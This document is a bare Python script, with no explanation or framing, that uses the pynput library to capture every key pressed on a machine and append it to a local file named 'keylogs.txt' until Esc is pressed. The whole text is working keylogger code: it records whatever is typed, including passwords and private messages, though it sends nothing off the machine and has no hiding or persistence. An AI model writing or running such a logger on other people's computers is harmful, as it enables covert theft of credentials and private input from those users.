```python
import pynput.keyboard as kb

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if key == kb.Key.space:
                f.write('[SPACE] ')
            elif key == kb.Key.enter:
                f.write('\n')
            else:
                f.write(f'{key} ')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == kb.Key.esc:
        return False

with kb.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```